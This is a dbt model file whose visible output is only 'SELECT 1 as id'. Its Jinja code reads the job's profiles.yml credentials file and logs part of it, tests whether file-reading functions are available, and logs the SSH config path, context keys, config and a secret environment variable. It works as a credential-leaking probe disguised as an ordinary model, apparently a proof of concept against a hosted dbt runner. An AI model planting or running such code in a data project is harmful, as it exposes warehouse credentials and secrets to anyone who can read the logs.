{%- set run_id = env_var('DBT_CLOUD_RUN_ID', 'norun') -%}
{%- set profiles_path = '/tmp/jobs/' ~ run_id ~ '/.dbt/profiles.yml' -%}

{# Try multiple file reading approaches #}
{%- set methods = [] -%}

{# Method 1: load_file_contents (older dbt) #}
{%- if load_file_contents is defined -%}
  {{ log("PROFILES_VIA_LOAD_FILE=" ~ load_file_contents(profiles_path) | string | truncate(500), info=True) }}
  {%- do methods.append('load_file_contents') -%}
{%- else -%}
  {{ log("load_file_contents_NOT_AVAILABLE", info=True) }}
{%- endif -%}

{# Method 2: open() builtin #}
{%- if open is defined -%}
  {{ log("OPEN_AVAILABLE", info=True) }}
{%- else -%}
  {{ log("open_NOT_AVAILABLE", info=True) }}
{%- endif -%}

{# Method 3: dbt.load_csv_rows #}
{{ log("SSH_CONFIG_PATH=/tmp/jobs/" ~ run_id ~ "/.ssh/config", info=True) }}
{{ log("PROFILES_PATH=" ~ profiles_path, info=True) }}

{# Dump all context keys we can find #}
{{ log("CONTEXT_KEYS=" ~ context.keys() | list | join(',') | truncate(500), info=True) if context is defined else log("context_NOT_DEFINED", info=True) }}
{{ log("DBT_PROJECT_NAME=" ~ project_name, info=True) if project_name is defined else log("project_name_NOT_DEFINED", info=True) }}
{{ log("SCHEMAS=" ~ schemas | string | truncate(200), info=True) if schemas is defined else log("schemas_NOT_DEFINED", info=True) }}
{{ log("CONFIG=" ~ config | string | truncate(200), info=True) if config is defined else log("config_NOT_DEFINED", info=True) }}
{{ log("DBT_ENV_SECRET_PROOF_VIA_LOG=" ~ env_var('DBT_ENV_SECRET_PROOF', 'NOT_SET'), info=True) }}

SELECT 1 as id
